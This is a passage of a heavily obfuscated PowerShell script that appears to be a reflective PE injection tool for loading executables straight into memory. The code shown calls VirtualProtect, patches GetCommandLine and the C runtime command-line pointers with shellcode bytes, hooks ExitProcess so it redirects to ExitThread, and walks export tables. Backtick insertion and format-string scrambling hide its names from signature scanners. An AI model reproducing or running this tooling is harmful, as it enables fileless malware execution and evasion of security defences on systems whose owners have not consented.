			${sECT`IO`Nh`eaD`eR} =  ( &("{1}{0}{2}"-f'-vAriabL','GET','E') 15Y4Hs )."Va`LUe"::"PtrTO`StRucTu`Re"(${SEc`TiO`NhE`AD`ERPtR}, [Type]${w`in`32TypeS}."im`A`gE_s`ect`iON_He`AdeR")
			[IntPtr]${s`e`C`TiOnptR} = &("{0}{3}{5}{4}{6}{1}{2}" -f'A','Unsig','ned','dd-Si','t','gnedIn','As') (${pein`Fo}."peh`AND`le") (${sEc`T`IonHeA`D`er}."v`IRtU`A`LaDDREss")
			
			[UInt32]${proTectf`l`Ag} = &("{7}{3}{1}{2}{0}{5}{4}{6}" -f 'P','tua','l','et-Vir','c','rote','tValue','G') ${SeCT`io`NHe`AdEr}."ChArAcTE`R`IsT`i`cS"
			[UInt32]${SeCT`IoN`Si`zE} = ${Secti`OnhE`AdeR}."vIRtua`lsi`Ze"
			
			[UInt32]${ol`dPrOte`ctF`Lag} = 0
			&("{1}{4}{2}{5}{3}{0}{6}"-f'eV','Test-Me','or','Rang','m','y','alid') -DebugString ("{9}{0}{1}{11}{7}{8}{10}{5}{3}{4}{12}{6}{2}{13}" -f 'd','at','c','ec','tion','t','::VirtualProte','-M','emoryPr','Up','o','e','Flags','t') -PEInfo ${PEI`NFo} -StartAddress ${sEcTion`p`TR} -Size ${s`E`C`TIoNsIze} | &("{1}{0}" -f'Null','Out-')
			${s`UcCE`sS} = ${w`iN32FUNCTiO`NS}."Vi`RTUaLproT`E`cT"."in`V`OKe"(${SeCt`ionP`TR}, ${SeCT`ION`s`IzE}, ${PrOteC`T`Flag}, [Ref]${Ol`DpR`Ot`ecTfLaG})
			if (${SUCCe`SS} -eq ${fa`LSe})
			{
				Throw ("{0}{2}{9}{1}{4}{5}{6}{3}{10}{8}{7}" -f 'Unab','o c','le','ge','h','a','n','mory protection','me',' t',' ')
			}
		}
	}
	
	
	
	Function up`d`At`e-e`xeFunc`TionS
	{
		Param(
		[Parameter(pOsiTion = 0, mandaTOry = ${t`RUE})]
		[System.Object]
		${P`EiN`Fo},
		
		[Parameter(PosItiON = 1, MaNdaTORy = ${t`RUe})]
		[System.Object]
		${w`I`N32f`UN`CTIoNs},
		
		[Parameter(pOsition = 2, mAndAtoRy = ${TR`Ue})]
		[System.Object]
		${WIn3`2CONS`TA`NtS},
		
		[Parameter(pOsitION = 3, mandAtOrY = ${TR`UE})]
		[String]
		${eXearg`U`M`enTS},
		
		[Parameter(PosiTION = 4, mAndATorY = ${T`RuE})]
		[IntPtr]
		${exeDOn`Eb`yt`Ep`TR}
		)
		
		
		${R`eTuR`NaRR`Ay} = @() 
		
		${PT`RS`Ize} =  ( &("{3}{2}{1}{0}"-f 'Le','Ab','I','get-VAR') ("15"+"y4H"+"S")  )."v`AlUE"::"sIZe`OF"([Type][IntPtr])
		[UInt32]${o`LDPROTecTFl`AG} = 0
		
		[IntPtr]${K`e`RnE`l32`hAnDLE} = ${w`In3`2f`UNctiOnS}."G`eTMOdU`LEHAN`DLE"."i`NVo`KE"(("{2}{0}{1}"-f'nel32.d','ll','Ker'))
		if (${kErNel`32H`A`ND`lE} -eq   (  &("{0}{1}" -f'ItE','M') ('vAriAb'+'L'+'e:1i2l') )."v`AlUE"::"Ze`RO")
		{
			throw ("{5}{2}{4}{0}{3}{1}" -f'e ','l','nel32 ha','nul','ndl','Ker')
		}
		
		[IntPtr]${KERn`ElBaS`Eh`ANdLE} = ${wIn32`F`UNCTio`NS}."get`m`OD`ULehANdLE"."i`NVOke"(("{0}{4}{1}{3}{2}" -f 'Ke','l','dll','Base.','rne'))
		if (${k`e`Rn`eLb`ASeHAn`DLe} -eq  (&("{0}{1}" -f'VariAB','Le')  ('1i'+'2l') -ValUE  )::"ze`Ro")
		{
			throw ("{1}{4}{0}{2}{3}" -f'l','KernelB','e ','null','ase hand')
		}

		
		
		
		${cMDlINE`War`gs`ptR} =  (&("{1}{2}{0}" -f 'e','vA','RiAbL') ('15y4H'+'S') -vAlUeonL )::("{2}{4}{1}{0}{3}" -f'Un','lobal','St','i','ringToHG').Invoke(${eX`eArG`U`MenTS})
		${c`M`DlInEAArGSp`TR} =   $15y4hs::("{2}{4}{0}{1}{3}"-f 'G','lobal','St','Ansi','ringToH').Invoke(${eX`Ea`RGum`EN`TS})
	
		[IntPtr]${geTCoMmAnDLi`N`e`AaDdr} = ${w`IN3`2f`Un`cTIOnS}."G`EtP`RO`caDDrESS"."i`NvO`kE"(${kE`RNelbASEh`AN`dlE}, ("{4}{0}{3}{1}{2}" -f'tComma','i','neA','ndL','Ge'))
		[IntPtr]${GEt`CoMM`ANdlIN`ewADDR} = ${wIN3`2fu`NCtI`ONs}."Getp`Roc`AdDr`eSS"."i`NVO`KE"(${k`ER`NEl`B`AsehAnDLe}, ("{1}{3}{2}{0}"-f'ndLineW','Get','a','Comm'))

		if (${G`EtcO`Mm`ANdL`iNeAADDR} -eq   (  &("{2}{3}{0}{1}"-f 'RIABl','e','GEt-','va') ('1I'+'2l') -VAL  )::"Ze`Ro" -or ${gETcomMaNd`li`N`eW`ADdr} -eq   (  &("{0}{1}{2}"-f'VaRiA','bL','E')  ('1I'+'2L') -VAlUeoNlY  )::"z`eRo")
		{
			throw ('Ge'+'tCommand'+'Line'+' '+'p'+'tr '+'null.'+' '+'GetComma'+'ndLi'+'ne'+'A: '+"$GetCommandLineAAddr. "+'Ge'+'tCom'+'ma'+'ndLi'+'n'+'eW: '+"$GetCommandLineWAddr")
		}

		
		[Byte[]]${she`lL`coDe1} = @()
		if (${P`T`RSIZE} -eq 8)
		{
			${SHEL`lc`oDe1} += 0x48	
		}
		${shel`l`cODe1} += 0xb8
		
		[Byte[]]${sHE`LLcO`dE2} = @(0xc3)
		${T`OtAlSi`Ze} = ${shE`llc`OdE1}."LENG`Th" + ${ptR`S`ize} + ${shEl`LcO`d`e2}."lE`NgTH"
		
		
		
		${GEtCOM`mA`NdliNea`orIGbYTE`s`P`TR} =   ( &("{0}{2}{1}"-f 'vaRI','BlE','a')  15y4Hs  -vaLUEO)::("{0}{2}{1}{3}"-f'AllocH','o','Gl','bal').Invoke(${TO`TaL`Size})
		${geTco`mMa`ND`Li`NEWo`Ri`gbYTES`PtR} =   $15Y4Hs::("{1}{2}{3}{0}"-f 'l','A','llo','cHGloba').Invoke(${T`o`TalSIze})
		${wIN`32funct`i`o`NS}."MEM`cPY"."In`VokE"(${g`EtCOMMAND`lI`N`e`AorI`g`B`YTeSptR}, ${gETcO`mMaND`li`NE`AAd`dr}, [UInt64]${t`ota`lSiZe}) | &("{0}{1}" -f'Out-N','ull')
		${W`i`N3`2FUNCTIO`NS}."mem`CpY"."InV`oKE"(${geT`coMmanD`Lin`ewo`RIG`BY`T`EsPTR}, ${g`eTc`o`mmaNDLiNEw`AddR}, [UInt64]${ToT`AL`SIzE}) | &("{2}{0}{1}" -f 't-N','ull','Ou')
		${REt`URn`ARrAY} += ,(${gE`T`Co`mmanD`LINe`AaDDR}, ${g`EtCo`mMA`Nd`l`iN`Eaor`iGbYtE`spTr}, ${tOtA`Ls`IZE})
		${R`EtUR`N`ArRaY} += ,(${gEtCOMMAN`DLiN`E`wadDR}, ${g`eTCOMM`AnD`lI`NEw`orIG`BY`TeSPTr}, ${tOt`AlS`IZE})

		
		[UInt32]${oLDPr`Ot`EcTfl`Ag} = 0
		${S`UCcE`SS} = ${wI`N32F`U`Nct`ioNS}."vIrTUA`lPr`o`TEct"."in`Vo`ke"(${G`eT`cOMmanD`l`inea`AD`DR}, [UInt32]${ToTA`LS`izE}, [UInt32](${WI`N`32c`onST`AnTs}."P`A`GE_EX`eC`UtE_R`eAdwR`ITE"), [Ref]${O`l`DProte`c`TFLAg})
		if (${su`C`cesS} = ${Fa`l`sE})
		{
			throw ("{6}{4}{3}{1}{2}{5}{0}" -f 'lProtect failed',' ','Virtu','to','l ','a','Cal')
		}
		
		${ge`Tc`Omma`ND`liN`EA`ADdrte`mp} = ${GEtC`oMmA`N`DlINE`A`AdDR}
		&("{1}{3}{4}{2}{0}{5}" -f 'T','Wr','e-Bytes','i','t','oMemory') -Bytes ${sh`EL`LcODE1} -MemoryAddress ${geT`coMMAn`d`linE`AAdD`RTemP}
		${Ge`TC`o`mMAn`DL`iN`eaADdrTe`mp} = &("{0}{2}{1}{3}"-f 'Add-Signed','ne','IntAsUnsig','d') ${G`ETcomm`A`Nd`l`inEA`A`DdrTemp} (${SH`ELL`C`Ode1}."L`E`NgTH")
		 (&('Gi')  ('vAr'+'i'+'abLE:15y'+'4Hs'))."VAl`UE"::("{1}{0}{2}{3}{4}" -f 'u','Struct','re','To','Ptr').Invoke(${CMdLin`Ea`ArgS`P`TR}, ${GEtco`mMA`NDLin`EAaD`Dr`TEmp}, ${FA`L`Se})
		${ge`TC`oMMAn`DLIneaAdd`RtEMp} = &("{2}{5}{1}{3}{4}{0}"-f 'd','nedInt','Add-Si','AsU','nsigne','g') ${gEtc`oMM`Andl`I`Ne`AADDRte`MP} ${P`TRSi`Ze}
		&("{2}{1}{3}{4}{0}" -f 'ry','ite','Wr','-Byte','sToMemo') -Bytes ${sH`elLCo`dE2} -MemoryAddress ${gETComMan`Dlin`eaad`d`RTeMp}
		
		${W`in32`FUNc`TiOnS}."v`I`R`Tualprote`cT"."INVo`KE"(${gEtComm`AN`D`lIN`eaA`dDR}, [UInt32]${tOt`A`lsIZe}, [UInt32]${oL`D`pr`OTE`CTFlaG}, [Ref]${olDP`ROtectF`l`AG}) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
		
		
		
		[UInt32]${o`lDpro`TECtF`lag} = 0
		${SU`C`CEss} = ${wI`N3`2f`UNctIONS}."V`IrtuaLpR`OtECt"."inv`Oke"(${G`e`TCOmmaNdlINEwa`D`DR}, [UInt32]${T`ot`A`LsizE}, [UInt32](${Wi`N32`Co`NstaNtS}."pA`GE_`EXe`CU`T`e_reaDwRiTE"), [Ref]${oLDP`R`OtE`cT`FlAG})
		if (${s`UcC`esS} = ${FA`lsE})
		{
			throw ("{1}{5}{2}{6}{0}{3}{4}"-f 'Protect fai','Call','t','l','ed',' to Vir','ual')
		}
		
		${GETCOmMa`NdlINE`W`A`DdrTEmp} = ${ge`T`cOMM`AND`liNe`WADDr}
		&("{1}{0}{3}{4}{2}"-f 'r','W','Memory','ite','-BytesTo') -Bytes ${SH`eLLc`ODE1} -MemoryAddress ${gEtC`OM`mAndLI`Ne`WaD`DRt`eMP}
		${GETCOMMA`NDl`I`Ne`Wa`dDRT`EMp} = &("{2}{3}{4}{0}{1}"-f'IntAsUnsigne','d','A','d','d-Signed') ${GeTcOmmANdLIn`EWad`dr`TE`mp} (${S`HEllcO`D`E1}."l`ENGTh")
		  (&("{2}{0}{1}" -f'RIABL','e','Va')  15y4hS  )."val`Ue"::("{2}{0}{1}" -f 'uctureT','oPtr','Str').Invoke(${Cm`dlInE`wa`R`gSptr}, ${get`coMma`NDlIneWadD`RTe`MP}, ${f`Al`se})
		${GE`TCo`M`mandLI`N`EwADdrtE`mp} = &("{2}{0}{3}{4}{1}"-f'gnedIntAsU','ned','Add-Si','n','sig') ${G`EtcOm`mAnd`lIN`e`WAddRTeMp} ${pT`RS`IZE}
		&("{2}{6}{0}{1}{3}{4}{5}" -f 'ite-B','ytes','W','T','oMemor','y','r') -Bytes ${shE`l`Lc`oDE2} -MemoryAddress ${GET`COmm`AnDL`In`e`WAd`DRtEMP}
		
		${WI`N`32funC`T`IOnS}."Vi`R`TUaLpr`OTECT"."InVO`ke"(${geT`c`o`MM`AnD`LINEW`ADDR}, [UInt32]${T`oT`Al`sIze}, [UInt32]${old`prot`e`CTFl`AG}, [Ref]${old`pR`OTeC`T`Flag}) | &("{1}{0}"-f 't-Null','Ou')
		
		
		
		
		
		
		
		
		${D`L`llIst} = @(("{0}{3}{1}{2}"-f 'm','vcr7','0d.dll','s'), ("{1}{0}{3}{2}" -f's','m','1d.dll','vcr7'), ("{0}{2}{1}" -f'msvcr8','d.dll','0'), ("{2}{3}{0}{1}"-f '.','dll','msv','cr90d'), ("{0}{1}{2}"-f 'm','svcr','100d.dll'), ("{0}{2}{1}{4}{3}" -f 'm','vcr110','s','dll','d.'), ("{0}{1}{2}"-f 'm','svcr70.d','ll') `
			, ("{2}{1}{0}"-f 'dll','svcr71.','m'), ("{3}{0}{1}{2}" -f 'r80.','d','ll','msvc'), ("{3}{1}{2}{0}"-f 'l','vcr90','.dl','ms'), ("{2}{0}{1}"-f'0','.dll','msvcr10'), ("{1}{0}{2}{3}" -f'r11','msvc','0','.dll'))
		
		foreach (${D`Ll} in ${Dl`ll`IsT})
		{
			[IntPtr]${d`lLhaNd`le} = ${wiN32f`UN`C`TIons}."getmod`UL`EHAN`dLe"."iN`V`oke"(${D`lL})
			if (${DL`lHAND`lE} -ne  ( &('gI')  VARIaBLe:1i2L  )."v`AluE"::"ze`Ro")
			{
				[IntPtr]${wC`MdLnA`ddR} = ${WIN32F`UN`cti`ONS}."G`ET`P`RocaDdress"."I`NvOKE"(${dLLH`AN`d`Le}, ("{0}{2}{1}"-f'_','ln','wcmd'))
				[IntPtr]${A`CM`DLN`ADDR} = ${wIn`3`2f`Unct`ioNs}."G`ET`pRoc`AddrE`ss"."I`NVoKe"(${dllh`And`lE}, ("{1}{2}{0}" -f 'dln','_a','cm'))
				if (${wcMD`lN`Addr} -eq  ( &("{1}{0}"-f'RiaBLE','va')  1i2l  )."V`ALUe"::"Z`eRo" -or ${aC`MdLN`ADdr} -eq  (&("{3}{1}{0}{2}" -f'IT','CHiLD','eM','get-') ("vAR"+"IABlE:1"+"I2"+"L")  )."V`ALue"::"ze`RO")
				{
					((("{10}{8}{2}{5}{11}{6}{1}{7}{4}{0}{3}{9}" -f 'c','md',' cou','mdl',' or _a','ldn1','t find _wc','ln','rror,','n','E','Pk'))."REPl`Ace"(([cHar]49+[cHar]80+[cHar]107),[STriNG][cHar]39))
				}
				
				${nEwACM`d`lNP`Tr} =   $15y4Hs::("{5}{3}{2}{4}{0}{1}" -f'n','si','ingToH','tr','GlobalA','S').Invoke(${EX`earG`UmeNtS})
				${NewW`cMdl`N`ptr} =   $15y4Hs::("{1}{2}{0}{3}"-f 'alUn','Str','ingToHGlob','i').Invoke(${E`xE`Argume`Nts})
				
				
				${origac`m`dL`Nptr} =  (  &("{3}{2}{1}{0}" -f 'abLe','aRI','-v','GEt')  15y4hs -VaL)::"p`TrtOsTRU`cTu`RE"(${acM`DLN`Ad`dR}, [Type][IntPtr])
				${ORigwC`m`dLN`pTR} =   (  &("{1}{2}{0}" -f 'M','g','ET-iTE') ("vAr"+"IA"+"ble:"+"1"+"5y4Hs"))."V`AlUE"::"pTR`TOsTrUCtU`Re"(${WC`MDLnA`D`Dr}, [Type][IntPtr])
				${o`RIgACMD`Ln`PtrSTo`R`AGe} =  $15y4hs::("{1}{2}{3}{0}"-f'bal','A','llocHGl','o').Invoke(${pTRSI`ze})
				${oRIG`WC`m`D`l`NPt`RSTOrAgE} =  (&("{3}{0}{2}{1}" -f 'arIA','le','b','GeT-V')  ("15y"+"4Hs"))."VAl`UE"::("{1}{3}{2}{0}" -f'al','AllocHG','b','lo').Invoke(${Pt`Rs`Ize})
				  ( &("{1}{0}{2}" -f'iT','ChilD','Em')  VarIablE:15Y4Hs)."vAl`UE"::("{3}{2}{0}{4}{1}"-f'e','oPtr','tur','Struc','T').Invoke(${Or`igAc`M`dlNptr}, ${oR`igaCMDLNptr`sTo`RA`Ge}, ${FaL`Se})
				 (  &('ls')  vAriAble:15y4Hs  )."V`AluE"::("{2}{1}{3}{0}"-f'Ptr','t','S','ructureTo').Invoke(${OR`iGWcmDL`Np`TR}, ${oRIGWcm`dln`P`TrStorA`Ge}, ${f`ALsE})
				${RE`Tu`RnaR`RAY} += ,(${ACM`DL`N`Addr}, ${oR`IGAC`MDLnP`TRst`ora`gE}, ${Pt`RS`iZE})
				${rET`URnA`RRay} += ,(${wC`MD`l`NAdDR}, ${OriGWC`MDl`Np`TRST`ora`GE}, ${PT`Rsize})
				
				${sU`cCe`SS} = ${wi`N32FUn`C`TIoNS}."v`iRtua`LpRo`T`eCT"."In`VOKe"(${acMdL`Na`Ddr}, [UInt32]${p`Tr`siZE}, [UInt32](${w`in`32c`onsTants}."pA`g`e_EXeCU`Te`_`RE`AdWritE"), [Ref]${o`ldpR`o`T`eCtfLAG})
				if (${sUc`C`ESs} = ${f`ALsE})
				{
					throw ("{4}{8}{3}{2}{5}{7}{0}{6}{1}"-f' ','iled','V','to ','C','i','fa','rtualProtect','all ')
				}
				  (&("{3}{0}{2}{1}" -f 'RIA','E','BL','geT-Va')  ("1"+"5Y4"+"hs") -VALueONL )::("{1}{3}{0}{2}{4}" -f'r','S','u','t','ctureToPtr').Invoke(${n`ewA`CMDlNpTr}, ${acmDLN`Ad`dR}, ${faL`se})
				${wiN`32`Fun`CTions}."ViRTU`Al`Pro`Tect"."in`VoKE"(${A`CMd`lnA`DdR}, [UInt32]${PT`Rs`iZE}, [UInt32](${oldp`R`OTEctFlag}), [Ref]${Ol`dP`ROTEc`T`FlAg}) | &("{2}{1}{0}"-f 'l','ul','Out-N')
				
				${SUcC`Ess} = ${Wi`N3`2fUncT`i`ons}."VI`Rtua`L`pRot`ect"."I`Nv`oKE"(${WcMd`LnA`Ddr}, [UInt32]${pT`Rs`IZe}, [UInt32](${WIN32CO`NS`TA`N`Ts}."paG`E_EXE`CU`TE_R`eAdWrI`TE"), [Ref]${OL`dPR`Ot`eCTflAG})
				if (${S`UcCE`Ss} = ${f`AlSE})
				{
					throw ("{0}{5}{4}{2}{6}{3}{1}" -f'C','t failed',' VirtualPro','c','o','all t','te')
				}
				  (  &('gI') VarIable:15Y4HS)."vA`LUE"::("{0}{3}{1}{2}{4}" -f'Stru','eT','o','ctur','Ptr').Invoke(${NE`W`wCMdL`Nptr}, ${W`C`MDLNa`dDR}, ${fa`lSe})
				${Win32Fu`N`C`T`iOns}."V`Irt`UALp`RoTE`CT"."i`NvOKE"(${wC`Mdlna`DDR}, [UInt32]${pT`RSI`Ze}, [UInt32](${Ol`DPRoTe`ctflAG}), [Ref]${oL`D`prOTEcTf`LaG}) | &("{0}{2}{1}" -f'Ou','Null','t-')
			}
		}
		
		
		
		
		

		${r`ET`UrnArR`Ay} = @()
		${ExItf`U`Nct`ionS} = @() 
		
		
		[IntPtr]${MScoReEH`A`Nd`le} = ${WIn32FUnc`T`IONS}."G`E`TMOdu`LEhAnDLe"."INv`okE"(("{3}{0}{2}{1}" -f'r','dll','ee.','msco'))
		if (${Msc`O`ReE`ha`NDle} -eq   (  &("{2}{1}{0}"-f 'LE','b','VArIA')  1i2L -VA )::"zE`RO")
		{
			throw ("{4}{1}{0}{2}{3}"-f'ree handle ','o','nul','l','msc')
		}
		[IntPtr]${cOrExi`Tp`R`O`c`EssADdR} = ${WIn32fU`Nc`TI`ONs}."GET`p`R`ocADdRESS"."I`NVokE"(${mS`C`oREE`hanDLE}, ("{1}{3}{4}{2}{0}" -f 'cess','Co','ro','rE','xitP'))
		if (${CorExI`TPR`o`ceSs`ADDR} -eq   ( &("{1}{2}{0}"-f 'em','g','eT-It')  vaRiAblE:1I2l  )."v`AlUE"::"z`Ero")
		{
			Throw ("{1}{0}{3}{4}{2}{5}" -f'tProce','CorExi','fo','ss ad','dress not ','und')
		}
		${exI`T`FUNCt`i`ONs} += ${CO`Re`xITPRO`cE`ssADdR}
		
		
		[IntPtr]${exitPR`oCeS`sad`dr} = ${W`iN32`FUnCtI`ons}."GetPr`oCa`DD`R`esS"."INV`o`kE"(${kEr`Nel32`HaN`dLE}, ("{3}{2}{1}{0}"-f'cess','tPro','xi','E'))
		if (${EXitpR`o`ce`ssa`DDr} -eq   (  &("{1}{0}"-f'i','Gc') VaRiAble:1i2L)."VAL`UE"::"zE`RO")
		{
			Throw ("{4}{2}{0}{3}{1}"-f's ',' found','es','not','ExitProcess addr')
		}
		${ex`I`TFUN`cTiOnS} += ${E`xiTpr`O`ceSSAddR}
		
		[UInt32]${O`LD`PrOt`E`CTFlAg} = 0
		foreach (${ProceX`itFU`NC`T`i`onAdDr} in ${ex`I`T`FunCt`iOns})
		{
			${P`R`oceXItfu`NCtIonADDR`Tmp} = ${proCEx`iTfunCT`Ion`A`ddr}
			
			
			[Byte[]]${s`HE`llcod`E1} = @(0xbb)
			[Byte[]]${s`Hel`LC`ode2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			
			if (${pT`RS`IZe} -eq 8)
			{
				[Byte[]]${sHE`lLco`d`E1} = @(0x48, 0xbb)
				[Byte[]]${SHeL`LCOd`E2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${s`heLLco`De3} = @(0xff, 0xd3)
			${toTa`lsI`zE} = ${sHEl`l`co`De1}."l`eNGtH" + ${PT`RSiZe} + ${SHelL`Co`d`e2}."L`enGtH" + ${Pt`RS`IZE} + ${sHe`l`LcOD`E3}."L`en`Gth"
			
			[IntPtr]${Exi`TTh`R`EA`dADdr} = ${wIN32`F`UNcti`oNs}."GetpR`oCa`D`dR`Ess"."inVo`ke"(${K`ERn`eL3`2`hANDLE}, ("{0}{1}{2}{3}"-f 'Exit','Thre','a','d'))
			if (${EX`i`Tt`H`ReaDaDdR} -eq   $1i2L::"ZE`Ro")
			{
				Throw ("{3}{1}{5}{4}{6}{2}{0}"-f' found','tThr','s not','Exi','addr','ead ','es')
			}

			${S`UCcesS} = ${w`IN32fUN`C`TiONs}."ViRtU`AlProte`ct"."InVO`Ke"(${prOCE`x`itfunC`TiOna`D`dr}, [UInt32]${ToTA`ls`i`zE}, [UInt32]${wi`N32consTa`N`Ts}."pA`Ge_ex`eCutE_`R`ea`DWRite", [Ref]${oL`dp`RO`TeCTf`Lag})
			if (${su`Cce`Ss} -eq ${F`Alse})
			{
				Throw ("{1}{5}{7}{3}{2}{4}{0}{6}"-f 'a','C','t','ualProtec',' f','all','iled',' to Virt')
			}
			
			
			${Exi`TpRoCEs`S`Or`IgBYtEs`PTR} =   $15Y4Hs::("{1}{2}{3}{0}"-f'al','Alloc','HGl','ob').Invoke(${toT`AL`SizE})
			${Wi`N32F`UNCTIO`NS}."mEm`cpY"."Inv`o`kE"(${E`X`ITp`Ro`cESsoRigBy`T`e`sPTR}, ${p`ROceXitf`U`NCtioNaddr}, [UInt64]${t`OtaLSi`ze}) | &("{1}{0}"-f 'ull','Out-N')
			${rETuR`N`A`Rray} += ,(${PRO`C`EXI`TFUnCtIOna`ddR}, ${exItProCEssoRI`g`ByT`E`sPTR}, ${TOt`A`lSIZe})
			
			
			
			&("{4}{0}{5}{1}{3}{2}"-f 'te-Byt','oMe','ry','mo','Wri','esT') -Bytes ${s`HELlCo`DE1} -MemoryAddress ${P`ROCEXItFUNc`TIo`NadD`RT`MP}
			${PrOcExi`TFUNct`IonaD`dR`TmP} = &("{3}{1}{0}{2}" -f 'tAsUns','gnedIn','igned','Add-Si') ${PrOcE`xIt`FUnc`TIOnA`d`d`Rt`Mp} (${Sh`Ell`C`oDe1}."l`eNGTH")
			  (&("{0}{2}{1}" -f'vAr','BlE','Ia') ("15"+"Y4Hs"))."V`AlUe"::("{0}{2}{3}{1}" -f 'Stru','reToPtr','c','tu').Invoke(${eXedoNEb`y`Te`ptr}, ${p`R`oCEX`i`TfUnC`TioN`AD`drTmP}, ${fa`L`sE})
			${pROCEX`iTfunc`TIO`N`Ad`dR`T`mP} = &("{3}{4}{0}{5}{1}{2}" -f'edI','tA','sUnsigned','Add-Sig','n','n') ${p`RO`CeXITFUn`C`TION`AddRTmP} ${P`Tr`siZE}
			&("{0}{3}{1}{2}"-f'Wr','es','ToMemory','ite-Byt') -Bytes ${s`heL`lcOdE2} -MemoryAddress ${pROcEXi`Tf`UnCtioNA`d`drTMp}
			${prO`CE`XIt`F`UNCTIonAddRTmP} = &("{1}{0}{3}{4}{2}{5}" -f 'ign','Add-S','sig','edIntAsU','n','ned') ${p`RoC`e`XiTFuN`CtiONAdDrTmp} (${sheL`LcO`De2}."LE`NGtH")
			 (  &("{0}{1}" -f 'G','ci')  VARIAbLe:15y4HS  )."v`ALUe"::("{2}{1}{0}"-f'eToPtr','uctur','Str').Invoke(${eX`I`T`Th`ReaDAddr}, ${PrO`cEXITF`UnctIoN`AddRT`mP}, ${fAl`Se})
			${prOcE`XITFun`CTi`O`NADDR`TmP} = &("{1}{4}{0}{2}{3}" -f 'ntAsU','Add-','ns','igned','SignedI') ${pR`Oce`XitF`UncTI`O`NADDRtmP} ${pTR`sI`ze}
			&("{0}{5}{2}{1}{3}{4}" -f 'Write-','o','ToMem','r','y','Bytes') -Bytes ${shEl`LCOd`E3} -MemoryAddress ${pROce`XiTF`U`NCTioNAD`drTMP}

			${WiN`32fu`NcT`i`oNs}."vI`R`TUAlpROT`E`CT"."inV`OKE"(${p`R`oC`EXi`T`FUNCTIOn`ADDR}, [UInt32]${T`OtALSi`ze}, [UInt32]${oLD`pr`oteCtF`L`AG}, [Ref]${OL`dPR`OTE`CtFlAG}) | &("{1}{2}{0}"-f'ull','Ou','t-N')
		}
		

		&("{2}{1}{0}{3}" -f 'te','ri','W','-Output') ${R`e`TU`RnArRAy}
	}
	
	
	
	
	Function C`OP`Y-`ARr`A`yoF`MEMaddResSes
	{
		Param(
		[Parameter(pOSiTiON = 0, mAnDatORy = ${TR`UE})]
		[Array[]]
		${c`op`yInfO},
		
		[Parameter(posItiON = 1, Mandatory = ${t`RuE})]
		[System.Object]
		${W`IN32FUnc`T`i`Ons},
		
		[Parameter(pOSiTIoN = 2, ManDaTorY = ${t`RuE})]
		[System.Object]
		${W`in32`Co`NSTANts}
		)

		[UInt32]${OLdprO`T`ec`TFlAG} = 0
		foreach (${I`NFO} in ${C`OPy`i`NfO})
		{
			${SU`cC`eSs} = ${W`in32Fun`C`T`ioNs}."Vi`R`T`UaLPrOtecT"."iN`V`OkE"(${I`NFo}[0], [UInt32]${I`NfO}[2], [UInt32]${wIN32cO`N`St`AnTS}."pAGE`_`execU`TE`_r`eadwRi`TE", [Ref]${oLDpROT`e`CtFLAG})
			if (${s`UCc`ESS} -eq ${Fa`L`sE})
			{
				Throw ("{6}{3}{8}{2}{0}{1}{7}{4}{5}" -f 'Protec','t','ual','Vir','ai','led','Call to ',' f','t')
			}
			
			${W`In`3`2FuncTiONs}."meM`CPY"."inV`okE"(${in`FO}[0], ${iN`FO}[1], [UInt64]${i`NfO}[2]) | &("{0}{2}{1}" -f 'Out-Nu','l','l')
			
			${Wi`N32F`U`Nc`TIoNS}."VI`RTU`AlProTeCt"."i`NV`OKe"(${i`NFo}[0], [UInt32]${in`FO}[2], [UInt32]${oLD`p`ROTEc`T`Flag}, [Ref]${ol`dprOt`eCt`FLAG}) | &("{2}{0}{1}" -f'ut','-Null','O')
		}
	}


	
	
	
	Function gET-mEMoRy`pROC`AD`d`R`ESs
	{
		Param(
		[Parameter(PosItiOn = 0, MANdaTORy = ${t`RuE})]
		[IntPtr]
		${P`Eh`AnD`Le},
		
		[Parameter(pOsitiON = 1, mandatOrY = ${T`Rue})]
		[String]
		${F`U`NcT`ionNAmE}
		)
		
		${W`i`N3`2TYPES} = &("{0}{1}{3}{2}"-f 'Get-','Win32','pes','Ty')
		${wIN`32`cON`stan`Ts} = &("{2}{0}{3}{1}{4}" -f 'W','n','Get-','in32Co','stants')
		${PEIn`Fo} = &("{2}{1}{4}{3}{0}"-f'dInfo','PED','Get-','taile','e') -PEHandle ${PE`H`AndlE} -Win32Types ${wIn`3`2t`ypES} -Win32Constants ${WIn32COns`T`A`NtS}
		
		
		if (${P`EINfO}."IM`AG`E`_Nt_HEadeRs"."OPtio`N`AlheaDER"."ExpOr`Tt`ABLE"."s`iZe" -eq 0)
		{
			return  (  &("{0}{1}"-f 'ChILdit','eM')  VAriaBle:1I2L)."v`ALUE"::"Z`ERO"
		}
		${ex`porT`TaBLepTr} = &("{0}{2}{4}{6}{1}{5}{3}"-f 'Add-','ned','S','ned','i','IntAsUnsig','g') (${p`eHaND`lE}) (${P`E`INFo}."IMage`_`Nt_H`E`ADeRS"."o`PTI`on`AlHEa`DER"."Exp`oRttaB`LE"."VIrt`UAL`AdDRESS")
		${eXPort`TaB`le} =   (  &("{0}{1}"-f 'g','cI') variAbLe:15y4Hs)."vA`LUe"::"p`Tr`ToStruct`U`RE"(${E`XpOr`TTA`BlePtR}, [Type]${W`IN32Ty`p`Es}."im`A`GE_e`XP`ORt`_direCT`orY")
		
		for (${i} = 0; ${i} -lt ${exPOr`TtA`B`LE}."N`Umber`ofNamEs"; ${I}++)
		{
			
			${nAMeOf`F`SE`Tptr} = &("{6}{4}{5}{0}{1}{3}{7}{2}"-f 'ed','Int','signed','AsU','dd-S','ign','A','n') (${p`EHANdLE}) (${eX`PORTt`ABle}."a`DdrE`ssO`FnamES" + (${i} *  (  &('Ls') ('v'+'A'+'RiABL'+'e:15y4'+'Hs') )."V`ALuE"::"s`i`ZeOF"([Type][UInt32])))
			${nA`meptR} = &("{4}{0}{1}{3}{2}" -f'Si','gnedIn','AsUnsigned','t','Add-') (${pE`H`AnDle}) ( ( &("{1}{0}{2}" -f't-','Ge','VARIABLE')  ("15"+"y4h"+"s")  -vaLUEonly)::"p`Trtost`RUcTure"(${n`AM`EoF`FSEtptr}, [Type][UInt32]))
			${nA`mE} =  (  &("{1}{0}"-f 'Ir','d')  vARiabLe:15Y4hs)."v`AlUe"::("{2}{3}{1}{0}"-f'i','ns','PtrToStri','ngA').Invoke(${Nam`e`ptR})

